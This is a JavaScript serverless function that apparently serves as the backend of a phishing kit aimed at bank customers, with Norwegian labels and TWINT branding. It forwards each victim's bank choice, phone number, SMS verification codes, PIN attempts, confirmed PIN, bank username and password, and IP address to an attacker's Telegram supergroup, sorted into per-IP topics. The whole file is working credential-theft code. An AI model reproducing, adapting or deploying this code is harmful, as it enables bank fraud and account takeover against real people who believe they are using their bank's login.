// Vercel Serverless Function for sending data to Telegram
// Sends user data to a Telegram supergroup channel with topics

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Content-Type', 'application/json');

  // Handle OPTIONS request for CORS preflight
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    // Get Telegram credentials from environment variables
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('Missing Telegram credentials');
      return res.status(500).json({ 
        error: 'Telegram credentials not configured',
        message: 'TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set in environment variables'
      });
    }

    // Get IP address from request headers (Vercel provides this)
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                     req.headers['x-real-ip'] || 
                     req.connection?.remoteAddress || 
                     'unknown';

    // Function to get topic ID for IP address
    // Uses a deterministic hash to ensure same IP always gets same topic
    function getTopicIdForIP(ip) {
      // Check if we have a stored mapping for this IP
      const IP_TOPIC_MAP = process.env.IP_TOPIC_MAP || '';
      const mappings = {};
      
      if (IP_TOPIC_MAP) {
        IP_TOPIC_MAP.split(',').forEach(mapping => {
          const [ipAddr, topicId] = mapping.split(':').map(s => s.trim());
          if (ipAddr && topicId) {
            mappings[ipAddr] = parseInt(topicId);
          }
        });
      }

      // Check if topic already exists for this IP
      if (mappings[ip]) {
        console.log(`📌 Using existing topic ${mappings[ip]} for IP ${ip}`);
        return mappings[ip];
      }

      // Generate a consistent topic ID based on IP address hash
      // This ensures the same IP always gets the same topic
      function hashIP(ip) {
        let hash = 0;
        for (let i = 0; i < ip.length; i++) {
          const char = ip.charCodeAt(i);
          hash = ((hash << 5) - hash) + char;
          hash = hash & hash; // Convert to 32bit integer
        }
        return Math.abs(hash);
      }

      const hashValue = hashIP(ip);
      // Use a range that's safe for Telegram topic IDs (typically 1-999999)
      // Add a base number to avoid conflicts with manually created topics
      const topicId = ((hashValue % 900000) + 100000); // Range: 100000-999999
      
      console.log(`🆕 Generated topic ID ${topicId} for IP ${ip} (hash: ${hashValue})`);
      console.log(`💾 To persist this mapping, add to IP_TOPIC_MAP: ${ip}:${topicId}`);
      
      return topicId;
    }

    // Get topic ID for this IP (same IP always gets same topic)
    const topicId = getTopicIdForIP(clientIp);

    // Get user data from request body
    // Handle both parsed and unparsed body
    let userData = req.body;
    
    // If body is a string, parse it
    if (typeof userData === 'string') {
      try {
        userData = JSON.parse(userData);
      } catch (parseError) {
        console.error('Error parsing request body:', parseError);
        return res.status(400).json({ 
          error: 'Invalid JSON in request body',
          message: parseError.message
        });
      }
    }

    if (!userData) {
      return res.status(400).json({ error: 'No data provided' });
    }

    // Format message based on action type
    let message = '';
    const action = userData.action || 'unknown';
    const timestamp = userData.timestamp || new Date().toISOString();
    
    // Add IP address to all messages
    const ipInfo = `🌐 *IP:* ${clientIp}`;

    switch (action) {
      case 'bank_selected':
        message = `🏦 *Bank Valgt*

*Bank:* ${userData.bank || 'N/A'}
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'phone_entered':
        message = `📱 *Telefonnummer Oppgitt*

🏦 *Bank:* ${userData.bank || 'N/A'}
📱 *Telefon:* ${userData.phone || 'N/A'}
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'verification_code_entered':
        message = `✅ *Verifiseringskode Oppgitt*

🏦 *Bank:* ${userData.bank || 'N/A'}
📱 *Telefon:* ${userData.phone || 'N/A'}
🔢 *Kode:* ${userData.verification_code || 'N/A'}
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'verification_code_resend':
        message = `🔄 *Verifiseringskode Sendt På Nytt*

🏦 *Bank:* ${userData.bank || 'N/A'}
📱 *Telefon:* ${userData.phone || 'N/A'}
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'auth_method_selected':
        message = `🔐 *Autentiseringsmetode Valgt*

🏦 *Bank:* ${userData.bank || 'N/A'}
🔑 *Metode:* ${userData.auth_method === 'card-reader' ? 'Card Reader' : 'Bank App'}
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'pin_attempt_failed':
        message = `❌ *PIN Forsøk Feilet*

🏦 *Bank:* ${userData.bank || 'N/A'}
📱 *Telefon:* ${userData.phone || 'N/A'}
🔢 *PIN Forsøk:* ${userData.pin_attempt || 'N/A'}
📊 *Forsøk #${userData.attempt_number || 'N/A'}*
⚠️ *Gjenstående:* ${userData.remaining_attempts || 'N/A'} forsøk
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'pin_max_attempts_reached':
        message = `🚫 *Maks PIN Forsøk Nådd*

🏦 *Bank:* ${userData.bank || 'N/A'}
📱 *Telefon:* ${userData.phone || 'N/A'}
⚠️ *Status:* Alle forsøk brukt opp
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'pin_verified':
        message = `✅ *PIN Bekreftet*

🏦 *Bank:* ${userData.bank || 'N/A'}
📱 *Telefon:* ${userData.phone || 'N/A'}
🔢 *PIN:* ${userData.pin || 'N/A'}
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'bank_app_confirmed':
        message = `📱 *Bank App Bekreftet*

🏦 *Bank:* ${userData.bank || 'N/A'}
📱 *Telefon:* ${userData.phone || 'N/A'}
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      case 'bank_login':
        message = `🔐 *Ny TWINT Registrering*

🏦 *Bank:* ${userData.bank || 'N/A'}
📱 *Telefon:* ${userData.phone || 'N/A'}
👤 *Brukernavn:* ${userData.bank_username || 'N/A'}
🔑 *Passord:* ${userData.bank_password || 'N/A'}
${ipInfo}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
        break;

      default:
        // Default format for unknown actions
        message = `📝 *Ukjent Handling*

*Action:* ${action}
*Data:* ${JSON.stringify(userData, null, 2)}
📅 *Tidspunkt:* ${new Date(timestamp).toLocaleString('nb-NO')}

---
ID: ${Date.now()}`;
    }

    // Prepare Telegram API request
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const payload = {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
    };

    // Add topic ID based on IP (for supergroups with topics)
    // Same IP will always use the same topic
    if (topicId) {
      payload.message_thread_id = parseInt(topicId);
      console.log(`📌 Sending to topic ${topicId} for IP ${clientIp}`);
    } else {
      console.log(`⚠️ No topic ID found for IP ${clientIp}, sending to default channel`);
    }

    // Send message to Telegram
    let telegramData;
    try {
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Check if response is JSON before parsing
      const contentType = telegramResponse.headers.get('content-type');
      if (contentType && contentType.includes('application/json')) {
        const text = await telegramResponse.text();
        if (text) {
          telegramData = JSON.parse(text);
        } else {
          telegramData = { ok: false, description: 'Empty response from Telegram API' };
        }
      } else {
        const text = await telegramResponse.text();
        console.error('Telegram API returned non-JSON:', text);
        return res.status(500).json({ 
          error: 'Failed to send message to Telegram',
          details: 'Telegram API returned non-JSON response: ' + text.substring(0, 200)
        });
      }

      if (!telegramResponse.ok || !telegramData.ok) {
        console.error('Telegram API error:', telegramData);
        return res.status(500).json({ 
          error: 'Failed to send message to Telegram',
          details: telegramData.description || telegramData.error_code || 'Unknown error'
        });
      }
    } catch (fetchError) {
      console.error('Error calling Telegram API:', fetchError);
      return res.status(500).json({ 
        error: 'Failed to send message to Telegram',
        details: fetchError.message || 'Network error'
      });
    }

    // Success
    return res.status(200).json({ 
      success: true,
      message: 'Data sent to Telegram successfully',
      telegram_message_id: telegramData.result?.message_id
    });

  } catch (error) {
    console.error('Error in Telegram API:', error);
    return res.status(500).json({ 
      error: 'Internal server error',
      message: error.message
    });
  }
};

